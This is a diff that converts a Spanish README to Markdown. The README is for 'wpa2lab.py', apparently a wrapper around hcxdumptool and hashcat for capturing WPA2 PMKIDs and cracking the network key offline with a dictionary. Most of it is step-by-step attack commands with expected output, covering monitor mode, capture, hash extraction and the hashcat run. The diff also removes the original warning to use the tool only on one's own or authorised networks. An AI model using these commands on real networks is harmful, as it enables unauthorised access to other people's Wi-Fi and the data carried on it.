@@ -1,91 +1,90 @@
-README.txt
-==========
+# README
 
-Objetivo
---------
+## Objetivo
 Sin desconectar al cliente, capturar la PMKID que el punto de acceso (AP) 
 envía durante cada asociación y crackearla sin conexión.
 
-Requisitos
-----------
-* Python 3.x
-* `wpa2lab.py` (este repositorio)
-* Adaptador Wi-Fi capaz de modo monitor
-* Herramientas externas:
+## Requisitos
+- Python 3.x  
+- `wpa2lab.py` (este repositorio)  
+- Adaptador Wi-Fi capaz de modo monitor  
+- Herramientas externas:
   - `hcxdumptool` (incluye `hcxpcaptool`)
-  - `hashcat` (v6.2 o superior)
-* Diccionario de contraseñas (ej. `/usr/share/wordlists/rockyou.txt`)
-* Permisos de super-usuario para operaciones con interfaz Wi-Fi
+  - `hashcat` (v6.2 o superior)  
+- Diccionario de contraseñas (ej. `/usr/share/wordlists/rockyou.txt`)  
+- Permisos de super-usuario para operaciones con interfaz Wi-Fi  
 
-Instalación rápida
-------------------
+## Instalación rápida
 Clonar el repositorio y situarse en la carpeta:
 
-    git clone https://github.com/tu-usuario/wpa2lab.git
-    cd wpa2lab
+```bash
+git clone https://github.com/tu-usuario/wpa2lab.git
+cd wpa2lab
+```
 
 Asegúrate de que `wpa2lab.py` sea ejecutable:
 
-    chmod +x wpa2lab.py
+```bash
+chmod +x wpa2lab.py
+```
 
-Guía de uso exprés
-------------------
-1. **Poner la tarjeta en modo monitor**
+## Guía de uso exprés
 
-       sudo ./wpa2lab.py prepare --iface wlan1
-       # → “Modo monitor activado en: wlan1mon”
+### 1. Poner la tarjeta en modo monitor
 
-2. **Capturar la PMKID**
+```bash
+sudo ./wpa2lab.py prepare --iface wlan1
+# → “Modo monitor activado en: wlan1mon”
+```
 
-       sudo ./wpa2lab.py capture
-       # Capturando PMKID en wlan1mon → dump.pcapng
-       # (Pulsa Ctrl-C para detener la captura)
+### 2. Capturar la PMKID
 
-   Esto genera un archivo `dump.pcapng` con todas las asociaciones 
-   AP↔cliente y los PMKID correspondientes.
+```bash
+sudo ./wpa2lab.py capture
+# Capturando PMKID en wlan1mon → dump.pcapng
+# (Pulsa Ctrl-C para detener la captura)
+```
 
-3. **Extraer el hash para Hashcat**
+Esto genera un archivo `dump.pcapng` con todas las asociaciones 
+AP↔cliente y los PMKID correspondientes.
 
-       sudo ./wpa2lab.py extract
-       # Extrae hash → hash.22000
+### 3. Extraer el hash para Hashcat
 
-   Internamente se ejecuta:
+```bash
+sudo ./wpa2lab.py extract
+# Extrae hash → hash.22000
+```
 
-       hcxpcaptool -z hash.22000 dump.pcapng
+Internamente se ejecuta:
 
-4. **Crackear sin conexión**
+```bash
+hcxpcaptool -z hash.22000 dump.pcapng
+```
 
-       sudo ./wpa2lab.py crack
+### 4. Crackear sin conexión
 
-   Que lanza automáticamente:
+```bash
+sudo ./wpa2lab.py crack
+```
 
-       hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
+Que lanza automáticamente:
 
-¿Cómo funciona el ataque de diccionario?
-----------------------------------------
+```bash
+hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
+```
+
+## ¿Cómo funciona el ataque de diccionario?
 Hashcat recorre cada contraseña del fichero elegido (en el ejemplo 
 `rockyou.txt`) y calcula la clave maestra necesaria para verificar si 
 coincide con el hash PMKID extraído.  
 Si la clave WPA2 de la red está dentro del diccionario, Hashcat la
 descubrirá y la mostrará en pantalla.
 
-Archivos generados
-------------------
-* **dump.pcapng** – Captura de tráfico con PMKID.  
-* **hash.22000**  – Hash listo para Hashcat (formato modo 22000).
+## Archivos generados
+- **dump.pcapng** – Captura de tráfico con PMKID  
+- **hash.22000**  – Hash listo para Hashcat (formato modo 22000)
 
-Opciones adicionales
---------------------
+## Opciones adicionales
 Todos los subcomandos aceptan `-h / --help` para ver parámetros 
 opcionales como interfaz de captura, canal, salida personalizada, 
 métodos de ataque, etc.
-
-Buenas prácticas y advertencias
--------------------------------
-* Usa tu propio equipamiento o redes para las que tengas permiso 
-  expreso. El uso no autorizado puede violar leyes locales.
-* Mantén tu sistema actualizado (drivers, hcxdumptool, hashcat).
-* El éxito depende de la calidad del diccionario; prueba diccionarios 
-  específicos además de `rockyou.txt` para mejores resultados.
-* Para aumentar la velocidad de crackeo, emplea GPU con drivers y 
-  OpenCL/CUDA compatibles.
